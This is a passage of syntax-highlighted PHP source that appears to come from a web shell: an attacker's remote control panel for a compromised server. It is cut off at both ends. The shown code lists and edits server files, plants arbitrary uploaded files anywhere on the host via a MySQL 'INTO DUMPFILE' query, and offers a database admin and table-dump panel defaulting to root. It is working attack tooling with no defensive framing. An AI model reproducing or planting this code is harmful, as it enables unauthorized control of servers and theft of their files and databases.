<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="color: #ffffff; background-color: #002451;">p(</span><span style="color: #99ffff;">'&lt;a href="javascript:dofile(\'downfile\',\''</span>.$<span style="color: #ffeead;">filedb</span>[<span style="color: #99ffff;">'server_link'</span><span style="text-decoration: underline;">].</span><span style="color: #99ffff; text-decoration: underline;">'\');"&gt;Down&lt;/a&gt; | '</span><span style="text-decoration: underline;">);</span>
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="color: #ffffff; background-color: #002451;">p(</span><span style="color: #99ffff;">'&lt;a href="javascript:copyfile(\''</span>.$<span style="color: #ffeead;">filedb</span>[<span style="color: #99ffff;">'server_link'</span>].<span style="color: #99ffff;">'\');"&gt;Co</span><span style="color: #99ffff; text-decoration: underline;">py&lt;/a&gt; | '</span><span style="text-decoration: underline;">);</span>
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="color: #ffffff; background-color: #002451;">p(</span><span style="color: #99ffff;">'&lt;a href="javascript:opfile(\'editfile\',\''</span>.$<span style="color: #ffeead;">filedb</span>[<span style="color: #99ffff;">'server_link'</span><span style="text-decoration: underline;">].</span><span style="color: #99ffff; text-decoration: underline;">'\',\''</span><span style="text-decoration: underline;">.$</span><span style="color: #ffeead; text-decoration: underline;">filedb</span><span style="text-decoration: underline;">[</span><span style="color: #99ffff; text-decoration: underline;">'dirlink'</span><span style="text-decoration: underline;">].</span><span style="color: #99ffff; text-decoration: underline;">'\');"&gt;Edit&lt;/a&gt; | '</span><span style="text-decoration: underline;">);</span>
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="color: #ffffff; background-color: #002451;">p(</span><span style="color: #99ffff;">'&lt;a href="javascript:rename(\''</span>.$<span style="color: #ffeead;">filedb</span>[<span style="color: #99ffff;">'server_link'</span>].<span style="color: #99ffff;">'\');"&gt;Rena</span><span style="color: #99ffff; text-decoration: underline;">me&lt;/a&gt;'</span><span style="text-decoration: underline;">);</span>
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="color: #ffffff; background-color: #002451;">p(</span><span style="color: #99ffff;">'&lt;/td&gt;&lt;/tr&gt;'</span>);
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   $<span style="color: #ffeead;">file_i</span>++;
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   }
<span style="background-color: #003f8e;"> </span>   }
<span style="background-color: #003f8e;"> </span>   <span style="color: #ffffff; background-color: #002451;">p(</span><span style="color: #99ffff;">'&lt;tr class="head"&gt;&lt;td&gt;&amp;nbsp;&lt;/td&gt;&lt;td&gt;Filename&lt;/td&gt;&lt;td width="16%"&gt;Last mod</span><span style="color: #99ffff; text-decoration: underline;">ified&lt;/td&gt;&lt;td width="10%"&gt;Size&lt;/td&gt;&lt;td width="20%"&gt;Chmod / Perms&lt;/td&gt;&lt;td width="22%"&gt;Action&lt;/td&gt;&lt;/tr&gt;'</span><span style="text-decoration: underline;">);</span>
<span style="background-color: #003f8e;"> </span>   <span style="color: #ffffff; background-color: #002451;">p(</span><span style="color: #99ffff;">'&lt;tr class="'</span>.<span style="color: #ffffff; background-color: #002451;">bg(</span>).<span style="color: #99ffff;">'"&gt;&lt;td align="center"&gt;&lt;input name="chkall" value="on" t</span><span style="color: #99ffff; text-decoration: underline;">ype="checkbox" onclick="CheckAll(this.form)" /&gt;&lt;/td&gt;&lt;td colspan="4"&gt;&lt;a href="javascript:dofile(\'delfiles\');"&gt;Delete selected&lt;/a&gt;&lt;/td&gt;&lt;td align="right"&gt;'</span><span style="text-decoration: underline;">.$</span><span style="color: #ffeead; text-decoration: underline;">dir_i</span><span style="text-decoration: underline;">.</span><span style="color: #99ffff; text-decoration: underline;">' directories / '</span><span style="text-decoration: underline;">.$</span><span style="color: #ffeead; text-decoration: underline;">file_i</span><span style="text-decoration: underline;">.</span><span style="color: #99ffff; text-decoration: underline;">' files&lt;/td&gt;&lt;/tr&gt;'</span><span style="text-decoration: underline;">);</span>
<span style="background-color: #003f8e;"> </span>   <span style="color: #ffffff; background-color: #002451;">p(</span><span style="color: #99ffff;">'&lt;/form&gt;&lt;/table&gt;'</span>);
}<span style="color: #7285b7; font-style: italic;">// </span><span style="color: #7285b7; font-style: italic;">end dir</span>

<span style="color: #d1f1a9;">elseif</span> ($<span style="color: #ffeead;">action</span> == <span style="color: #99ffff;">'sqlfile'</span>) {
<span style="background-color: #003f8e;"> </span>   <span style="color: #d1f1a9;">if</span>($<span style="color: #ffeead;">doing</span>==<span style="color: #99ffff;">"mysqlupload"</span>){
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   $<span style="color: #ffeead;">file</span> = $<span style="color: #bbdaff;">_FILES</span>[<span style="color: #99ffff;">'uploadfile'</span>];
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   $<span style="color: #ffeead;">filename</span> = $<span style="color: #ffeead;">file</span>[<span style="color: #99ffff;">'tmp_name'</span>];
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="color: #d1f1a9;">if</span> (<span style="color: #ffffff; background-color: #002451;">file_exists(</span>$<span style="color: #ffeead;">savepath</span>)) {
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="color: #ffffff; background-color: #002451;">m(</span><span style="color: #99ffff;">'The goal file has already existed'</span>);
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   } <span style="color: #d1f1a9;">else</span> {
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="color: #d1f1a9;">if</span>(!$<span style="color: #ffeead;">filename</span>) {
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="color: #ffffff; background-color: #002451;">m(</span><span style="color: #99ffff;">'Please choose a file'</span>);
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   } <span style="color: #d1f1a9;">else</span> {
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   $<span style="color: #ffeead;">fp</span>=@<span style="color: #ffffff; background-color: #002451;">fopen(</span>$<span style="color: #ffeead;">filename</span>,<span style="color: #99ffff;">'r'</span>);
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   $<span style="color: #ffeead;">contents</span>=@<span style="color: #ffffff; background-color: #002451;">fread(</span>$<span style="color: #ffeead;">fp</span>, <span style="color: #ffffff; background-color: #002451;">filesize(</span>$<span style="color: #ffeead;">filename</span>));
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   @<span style="color: #ffffff; background-color: #002451;">fclose(</span>$<span style="color: #ffeead;">fp</span>);
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   $<span style="color: #ffeead;">contents</span> = <span style="color: #ffffff; background-color: #002451;">bin2hex(</span>$<span style="color: #ffeead;">contents</span>);
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="color: #d1f1a9;">if</span>(!$<span style="color: #ffeead;">upname</span>) $<span style="color: #ffeead;">upname</span> = $<span style="color: #ffeead;">file</span>[<span style="color: #99ffff;">'name'</span>];
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   $<span style="color: #ffeead;">mysqllink</span> = <span style="color: #ffffff; background-color: #002451;">mydbconn(</span>$<span style="color: #ffeead;">dbhost</span>,$<span style="color: #ffeead;">dbuser</span>,$<span style="color: #ffeead;">dbpass</span>,$<span style="color: #ffeead;">dbname</span>,$<span style="color: #ffeead;">charset</span>,$<span style="color: #ffeead; text-decoration: underline;">dbport</span><span style="text-decoration: underline;">);</span>
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   $<span style="color: #ffeead;">result</span> = <span style="color: #ffffff; background-color: #002451;">q(</span><span style="color: #99ffff;">"SELECT 0x{$contents} FROM mysql.user INTO DUMPFILE </span><span style="color: #99ffff; text-decoration: underline;">'$savepath';"</span><span style="text-decoration: underline;">);</span>
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="color: #ffffff; background-color: #002451;">m(</span>$<span style="color: #ffeead;">result</span> ? <span style="color: #99ffff;">'Upload success'</span> : <span style="color: #99ffff;">'Upload has failed: '</span>.<span style="color: #ffffff; background-color: #002451;">mysql_error</span><span style="color: #ffffff; background-color: #002451; text-decoration: underline;">(</span><span style="text-decoration: underline;">));</span>
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   }
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   }
<span style="background-color: #003f8e;"> </span>   }
<span style="color: #ebbbff;">?&gt;</span>
<span style="color: #bbdaff;">&lt;script</span> <span style="color: #bbdaff;">type=</span><span style="color: #99ffff;">"text/javascript"</span><span style="color: #bbdaff;">&gt;</span>
<span style="color: #d1f1a9;">function</span> <span style="color: #ffc58f;">mysqlfile</span>(<span style="color: #ff9da4; font-weight: bold;">doing</span>){
<span style="background-color: #003f8e;"> </span>   <span style="color: #d1f1a9;">if</span>(!<span style="color: #ff9da4; font-weight: bold;">doing</span>) <span style="color: #d1f1a9;">return</span>;
<span style="background-color: #003f8e;"> </span>   <span style="color: #ffffff; background-color: #002451;">$(</span><span style="color: #99ffff;">'doing'</span>).<span style="color: #ff9da4; font-weight: bold;">value</span>=<span style="color: #ff9da4; font-weight: bold;">doing</span>;
<span style="background-color: #003f8e;"> </span>   <span style="color: #ffffff; background-color: #002451;">$(</span><span style="color: #99ffff;">'mysqlfile'</span>).<span style="color: #ff9da4; font-weight: bold;">dbhost</span>.<span style="color: #ff9da4; font-weight: bold;">value</span>=<span style="color: #ffffff; background-color: #002451;">$(</span><span style="color: #99ffff;">'dbinfo'</span>).<span style="color: #ff9da4; font-weight: bold;">dbhost</span>.<span style="color: #ff9da4; font-weight: bold;">value</span>;
<span style="background-color: #003f8e;"> </span>   <span style="color: #ffffff; background-color: #002451;">$(</span><span style="color: #99ffff;">'mysqlfile'</span>).<span style="color: #ff9da4; font-weight: bold;">dbport</span>.<span style="color: #ff9da4; font-weight: bold;">value</span>=<span style="color: #ffffff; background-color: #002451;">$(</span><span style="color: #99ffff;">'dbinfo'</span>).<span style="color: #ff9da4; font-weight: bold;">dbport</span>.<span style="color: #ff9da4; font-weight: bold;">value</span>;
<span style="background-color: #003f8e;"> </span>   <span style="color: #ffffff; background-color: #002451;">$(</span><span style="color: #99ffff;">'mysqlfile'</span>).<span style="color: #ff9da4; font-weight: bold;">dbuser</span>.<span style="color: #ff9da4; font-weight: bold;">value</span>=<span style="color: #ffffff; background-color: #002451;">$(</span><span style="color: #99ffff;">'dbinfo'</span>).<span style="color: #ff9da4; font-weight: bold;">dbuser</span>.<span style="color: #ff9da4; font-weight: bold;">value</span>;
<span style="background-color: #003f8e;"> </span>   <span style="color: #ffffff; background-color: #002451;">$(</span><span style="color: #99ffff;">'mysqlfile'</span>).<span style="color: #ff9da4; font-weight: bold;">dbpass</span>.<span style="color: #ff9da4; font-weight: bold;">value</span>=<span style="color: #ffffff; background-color: #002451;">$(</span><span style="color: #99ffff;">'dbinfo'</span>).<span style="color: #ff9da4; font-weight: bold;">dbpass</span>.<span style="color: #ff9da4; font-weight: bold;">value</span>;
<span style="background-color: #003f8e;"> </span>   <span style="color: #ffffff; background-color: #002451;">$(</span><span style="color: #99ffff;">'mysqlfile'</span>).<span style="color: #ff9da4; font-weight: bold;">dbname</span>.<span style="color: #ff9da4; font-weight: bold;">value</span>=<span style="color: #ffffff; background-color: #002451;">$(</span><span style="color: #99ffff;">'dbinfo'</span>).<span style="color: #ff9da4; font-weight: bold;">dbname</span>.<span style="color: #ff9da4; font-weight: bold;">value</span>;
<span style="background-color: #003f8e;"> </span>   <span style="color: #ffffff; background-color: #002451;">$(</span><span style="color: #99ffff;">'mysqlfile'</span>).<span style="color: #ff9da4; font-weight: bold;">charset</span>.<span style="color: #ff9da4; font-weight: bold;">value</span>=<span style="color: #ffffff; background-color: #002451;">$(</span><span style="color: #99ffff;">'dbinfo'</span>).<span style="color: #ff9da4; font-weight: bold;">charset</span>.<span style="color: #ff9da4; font-weight: bold;">value</span>;
<span style="background-color: #003f8e;"> </span>   <span style="color: #ffffff; background-color: #002451;">$(</span><span style="color: #99ffff;">'mysqlfile'</span>).<span style="color: #ffffff; background-color: #002451;">submit(</span>);
}
<span style="color: #bbdaff;">&lt;/script&gt;</span>
<span style="color: #ebbbff;">&lt;?php</span>
<span style="background-color: #003f8e;"> </span>   !$<span style="color: #ffeead;">dbhost</span> &amp;&amp; $<span style="color: #ffeead;">dbhost</span> = <span style="color: #99ffff;">'localhost'</span>;
<span style="background-color: #003f8e;"> </span>   !$<span style="color: #ffeead;">dbuser</span> &amp;&amp; $<span style="color: #ffeead;">dbuser</span> = <span style="color: #99ffff;">'root'</span>;
<span style="background-color: #003f8e;"> </span>   !$<span style="color: #ffeead;">dbport</span> &amp;&amp; $<span style="color: #ffeead;">dbport</span> = <span style="color: #99ffff;">'3306'</span>;
<span style="background-color: #003f8e;"> </span>   <span style="color: #ffffff; background-color: #002451;">formhead(array(</span><span style="color: #99ffff;">'title'</span>=<span style="color: #bbdaff;">&gt;</span><span style="color: #99ffff;">'MYSQL Information'</span>,<span style="color: #99ffff;">'name'</span>=&gt;<span style="color: #99ffff;">'dbinfo'</span>));
<span style="background-color: #003f8e;"> </span>   <span style="color: #ffffff; background-color: #002451;">makehide(</span><span style="color: #99ffff;">'action'</span>,<span style="color: #99ffff;">'sqlfile'</span>);
<span style="background-color: #003f8e;"> </span>   <span style="color: #ffffff; background-color: #002451;">p(</span><span style="color: #99ffff;">'&lt;p&gt;'</span>);
<span style="background-color: #003f8e;"> </span>   <span style="color: #ffffff; background-color: #002451;">p(</span><span style="color: #99ffff;">'DBHost:'</span>);
<span style="background-color: #003f8e;"> </span>   <span style="color: #ffffff; background-color: #002451;">makeinput(array(</span><span style="color: #99ffff;">'name'</span>=&gt;<span style="color: #99ffff;">'dbhost'</span>,<span style="color: #99ffff;">'size'</span>=&gt;<span style="color: #ffffff; background-color: #002451;">20</span>,<span style="color: #99ffff;">'value'</span>=&gt;$<span style="color: #ffeead;">dbhost</span>));
<span style="background-color: #003f8e;"> </span>   <span style="color: #ffffff; background-color: #002451;">p(</span><span style="color: #99ffff;">':'</span>);
<span style="background-color: #003f8e;"> </span>   <span style="color: #ffffff; background-color: #002451;">makeinput(array(</span><span style="color: #99ffff;">'name'</span>=&gt;<span style="color: #99ffff;">'dbport'</span>,<span style="color: #99ffff;">'size'</span>=&gt;<span style="color: #ffffff; background-color: #002451;">4</span>,<span style="color: #99ffff;">'value'</span>=&gt;$<span style="color: #ffeead;">dbport</span>));
<span style="background-color: #003f8e;"> </span>   <span style="color: #ffffff; background-color: #002451;">p(</span><span style="color: #99ffff;">'DBUser:'</span>);
<span style="background-color: #003f8e;"> </span>   <span style="color: #ffffff; background-color: #002451;">makeinput(array(</span><span style="color: #99ffff;">'name'</span>=&gt;<span style="color: #99ffff;">'dbuser'</span>,<span style="color: #99ffff;">'size'</span>=&gt;<span style="color: #ffffff; background-color: #002451;">15</span>,<span style="color: #99ffff;">'value'</span>=&gt;$<span style="color: #ffeead;">dbuser</span>));
<span style="background-color: #003f8e;"> </span>   <span style="color: #ffffff; background-color: #002451;">p(</span><span style="color: #99ffff;">'DBPass:'</span>);
<span style="background-color: #003f8e;"> </span>   <span style="color: #ffffff; background-color: #002451;">makeinput(array(</span><span style="color: #99ffff;">'name'</span>=&gt;<span style="color: #99ffff;">'dbpass'</span>,<span style="color: #99ffff;">'size'</span>=&gt;<span style="color: #ffffff; background-color: #002451;">15</span>,<span style="color: #99ffff;">'value'</span>=&gt;$<span style="color: #ffeead;">dbpass</span>));
<span style="background-color: #003f8e;"> </span>   <span style="color: #ffffff; background-color: #002451;">p(</span><span style="color: #99ffff;">'DBName:'</span>);
<span style="background-color: #003f8e;"> </span>   <span style="color: #ffffff; background-color: #002451;">makeinput(array(</span><span style="color: #99ffff;">'name'</span>=&gt;<span style="color: #99ffff;">'dbname'</span>,<span style="color: #99ffff;">'size'</span>=&gt;<span style="color: #ffffff; background-color: #002451;">15</span>,<span style="color: #99ffff;">'value'</span>=&gt;$<span style="color: #ffeead;">dbname</span>));
<span style="background-color: #003f8e;"> </span>   <span style="color: #ffffff; background-color: #002451;">p(</span><span style="color: #99ffff;">'DBCharset:'</span>);
<span style="background-color: #003f8e;"> </span>   <span style="color: #ffffff; background-color: #002451;">makeselect(array(</span><span style="color: #99ffff;">'name'</span>=&gt;<span style="color: #99ffff;">'charset'</span>,<span style="color: #99ffff;">'option'</span>=&gt;$<span style="color: #ffeead;">charsetdb</span>,<span style="color: #99ffff;">'selected'</span>=&gt;$<span style="color: #ffeead;">charset</span><span style="text-decoration: underline;">,</span><span style="color: #99ffff; text-decoration: underline;">'nokey'</span><span style="text-decoration: underline;">=&gt;</span><span style="color: #ffffff; background-color: #002451; text-decoration: underline;">1</span><span style="text-decoration: underline;">));</span>
<span style="background-color: #003f8e;"> </span>   <span style="color: #ffffff; background-color: #002451;">p(</span><span style="color: #99ffff;">'&lt;/p&gt;'</span>);
<span style="background-color: #003f8e;"> </span>   <span style="color: #ffffff; background-color: #002451;">formfoot(</span>);
<span style="background-color: #003f8e;"> </span>   <span style="color: #ffffff; background-color: #002451;">p(</span><span style="color: #99ffff;">'&lt;form action="'</span>.$<span style="color: #ffeead;">self</span>.<span style="color: #99ffff;">'" method="POST" enctype="multipart/form-data" name</span><span style="color: #99ffff; text-decoration: underline;">="mysqlfile" id="mysqlfile"&gt;'</span><span style="text-decoration: underline;">);</span>
<span style="background-color: #003f8e;"> </span>   <span style="color: #ffffff; background-color: #002451;">p(</span><span style="color: #99ffff;">'&lt;h2&gt;Upload file&lt;/h2&gt;'</span>);
<span style="background-color: #003f8e;"> </span>   <span style="color: #ffffff; background-color: #002451;">p(</span><span style="color: #99ffff;">'&lt;p&gt;&lt;b&gt;This operation the DB user must has FILE privilege&lt;/b&gt;&lt;/p&gt;'</span>);
<span style="background-color: #003f8e;"> </span>   <span style="color: #ffffff; background-color: #002451;">p(</span><span style="color: #99ffff;">'&lt;p&gt;Save path(fullpath): &lt;input class="input" name="savepath" size="45" ty</span><span style="color: #99ffff; text-decoration: underline;">pe="text" /&gt; Choose a file: &lt;input class="input" name="uploadfile" type="file" /&gt; &lt;a href="javascript:mysqlfile(\'mysqlupload\');"&gt;Upload&lt;/a&gt;&lt;/p&gt;'</span><span style="text-decoration: underline;">);</span>
<span style="background-color: #003f8e;"> </span>   <span style="color: #ffffff; background-color: #002451;">p(</span><span style="color: #99ffff;">'&lt;h2&gt;Download file&lt;/h2&gt;'</span>);
<span style="background-color: #003f8e;"> </span>   <span style="color: #ffffff; background-color: #002451;">p(</span><span style="color: #99ffff;">'&lt;p&gt;File: &lt;input class="input" name="mysqldlfile" size="115" type="text" /</span><span style="color: #99ffff; text-decoration: underline;">&gt; &lt;a href="javascript:mysqlfile(\'mysqldown\');"&gt;Download&lt;/a&gt;&lt;/p&gt;'</span><span style="text-decoration: underline;">);</span>
<span style="background-color: #003f8e;"> </span>   <span style="color: #ffffff; background-color: #002451;">makehide(</span><span style="color: #99ffff;">'dbhost'</span>);
<span style="background-color: #003f8e;"> </span>   <span style="color: #ffffff; background-color: #002451;">makehide(</span><span style="color: #99ffff;">'dbport'</span>);
<span style="background-color: #003f8e;"> </span>   <span style="color: #ffffff; background-color: #002451;">makehide(</span><span style="color: #99ffff;">'dbuser'</span>);
<span style="background-color: #003f8e;"> </span>   <span style="color: #ffffff; background-color: #002451;">makehide(</span><span style="color: #99ffff;">'dbpass'</span>);
<span style="background-color: #003f8e;"> </span>   <span style="color: #ffffff; background-color: #002451;">makehide(</span><span style="color: #99ffff;">'dbname'</span>);
<span style="background-color: #003f8e;"> </span>   <span style="color: #ffffff; background-color: #002451;">makehide(</span><span style="color: #99ffff;">'charset'</span>);
<span style="background-color: #003f8e;"> </span>   <span style="color: #ffffff; background-color: #002451;">makehide(</span><span style="color: #99ffff;">'doing'</span>);
<span style="background-color: #003f8e;"> </span>   <span style="color: #ffffff; background-color: #002451;">makehide(</span><span style="color: #99ffff;">'action'</span>,<span style="color: #99ffff;">'sqlfile'</span>);
<span style="background-color: #003f8e;"> </span>   <span style="color: #ffffff; background-color: #002451;">p(</span><span style="color: #99ffff;">'&lt;/form&gt;'</span>);
}

<span style="color: #d1f1a9;">elseif</span> ($<span style="color: #ffeead;">action</span> == <span style="color: #99ffff;">'mysqladmin'</span>) {
<span style="background-color: #003f8e;"> </span>   !$<span style="color: #ffeead;">dbhost</span> &amp;&amp; $<span style="color: #ffeead;">dbhost</span> = <span style="color: #99ffff;">'localhost'</span>;
<span style="background-color: #003f8e;"> </span>   !$<span style="color: #ffeead;">dbuser</span> &amp;&amp; $<span style="color: #ffeead;">dbuser</span> = <span style="color: #99ffff;">'root'</span>;
<span style="background-color: #003f8e;"> </span>   !$<span style="color: #ffeead;">dbport</span> &amp;&amp; $<span style="color: #ffeead;">dbport</span> = <span style="color: #99ffff;">'3306'</span>;
<span style="background-color: #003f8e;"> </span>   $<span style="color: #ffeead;">dbform</span> = <span style="color: #99ffff;">'&lt;input type="hidden" id="connect" name="connect" value="1" /&gt;'</span>;
<span style="background-color: #003f8e;"> </span>   <span style="color: #d1f1a9;">if</span>(<span style="color: #ffffff; background-color: #002451;">isset(</span>$<span style="color: #ffeead;">dbhost</span>)){
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   $<span style="color: #ffeead;">dbform</span> .= <span style="color: #99ffff;">"&lt;input type=\"hidden\" id=\"dbhost\" name=\"dbhost\" value=\</span><span style="color: #99ffff; text-decoration: underline;">"$dbhost\" /&gt;\n"</span><span style="text-decoration: underline;">;</span>
<span style="background-color: #003f8e;"> </span>   }
<span style="background-color: #003f8e;"> </span>   <span style="color: #d1f1a9;">if</span>(<span style="color: #ffffff; background-color: #002451;">isset(</span>$<span style="color: #ffeead;">dbuser</span>)) {
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   $<span style="color: #ffeead;">dbform</span> .= <span style="color: #99ffff;">"&lt;input type=\"hidden\" id=\"dbuser\" name=\"dbuser\" value=\</span><span style="color: #99ffff; text-decoration: underline;">"$dbuser\" /&gt;\n"</span><span style="text-decoration: underline;">;</span>
<span style="background-color: #003f8e;"> </span>   }
<span style="background-color: #003f8e;"> </span>   <span style="color: #d1f1a9;">if</span>(<span style="color: #ffffff; background-color: #002451;">isset(</span>$<span style="color: #ffeead;">dbpass</span>)) {
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   $<span style="color: #ffeead;">dbform</span> .= <span style="color: #99ffff;">"&lt;input type=\"hidden\" id=\"dbpass\" name=\"dbpass\" value=\</span><span style="color: #99ffff; text-decoration: underline;">"$dbpass\" /&gt;\n"</span><span style="text-decoration: underline;">;</span>
<span style="background-color: #003f8e;"> </span>   }
<span style="background-color: #003f8e;"> </span>   <span style="color: #d1f1a9;">if</span>(<span style="color: #ffffff; background-color: #002451;">isset(</span>$<span style="color: #ffeead;">dbport</span>)) {
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   $<span style="color: #ffeead;">dbform</span> .= <span style="color: #99ffff;">"&lt;input type=\"hidden\" id=\"dbport\" name=\"dbport\" value=\</span><span style="color: #99ffff; text-decoration: underline;">"$dbport\" /&gt;\n"</span><span style="text-decoration: underline;">;</span>
<span style="background-color: #003f8e;"> </span>   }
<span style="background-color: #003f8e;"> </span>   <span style="color: #d1f1a9;">if</span>(<span style="color: #ffffff; background-color: #002451;">isset(</span>$<span style="color: #ffeead;">dbname</span>)) {
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   $<span style="color: #ffeead;">dbform</span> .= <span style="color: #99ffff;">"&lt;input type=\"hidden\" id=\"dbname\" name=\"dbname\" value=\</span><span style="color: #99ffff; text-decoration: underline;">"$dbname\" /&gt;\n"</span><span style="text-decoration: underline;">;</span>
<span style="background-color: #003f8e;"> </span>   }
<span style="background-color: #003f8e;"> </span>   <span style="color: #d1f1a9;">if</span>(<span style="color: #ffffff; background-color: #002451;">isset(</span>$<span style="color: #ffeead;">charset</span>)) {
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   $<span style="color: #ffeead;">dbform</span> .= <span style="color: #99ffff;">"&lt;input type=\"hidden\" id=\"charset\" name=\"charset\" value</span><span style="color: #99ffff; text-decoration: underline;">=\"$charset\" /&gt;\n"</span><span style="text-decoration: underline;">;</span>
<span style="background-color: #003f8e;"> </span>   }

<span style="background-color: #003f8e;"> </span>   <span style="color: #d1f1a9;">if</span> ($<span style="color: #ffeead;">doing</span> == <span style="color: #99ffff;">'backupmysql'</span> &amp;&amp; $<span style="color: #ffeead;">saveasfile</span>) {
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="color: #d1f1a9;">if</span> (!$<span style="color: #ffeead;">table</span>) {
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="color: #ffffff; background-color: #002451;">m(</span><span style="color: #99ffff;">'Please choose the table'</span>);
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   } <span style="color: #d1f1a9;">else</span> {
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   $<span style="color: #ffeead;">mysqllink</span> = <span style="color: #ffffff; background-color: #002451;">mydbconn(</span>$<span style="color: #ffeead;">dbhost</span>,$<span style="color: #ffeead;">dbuser</span>,$<span style="color: #ffeead;">dbpass</span>,$<span style="color: #ffeead;">dbname</span>,$<span style="color: #ffeead;">charset</span>,$<span style="color: #ffeead;">dbpo</span><span style="color: #ffeead; text-decoration: underline;">rt</span><span style="text-decoration: underline;">);</span>
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   $<span style="color: #ffeead;">fp</span> = @<span style="color: #ffffff; background-color: #002451;">fopen(</span>$<span style="color: #ffeead;">path</span>,<span style="color: #99ffff;">'w'</span>);
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="color: #d1f1a9;">if</span> ($<span style="color: #ffeead;">fp</span>) {
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="color: #d1f1a9;">foreach</span>($<span style="color: #ffeead;">table</span> <span style="color: #d1f1a9;">as</span> $<span style="color: #ffeead;">k</span> =&gt; $<span style="color: #ffeead;">v</span>) {
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="color: #d1f1a9;">if</span> ($<span style="color: #ffeead;">v</span>) {
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="color: #ffffff; background-color: #002451;">sqldumptable(</span>$<span style="color: #ffeead;">v</span>, $<span style="color: #ffeead;">fp</span>);
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   }
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   }
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="color: #ffffff; background-color: #002451;">fclose(</span>$<span style="color: #ffeead;">fp</span>);<span style="color: #ff9da4; background-color: #003f8e;">                </span>
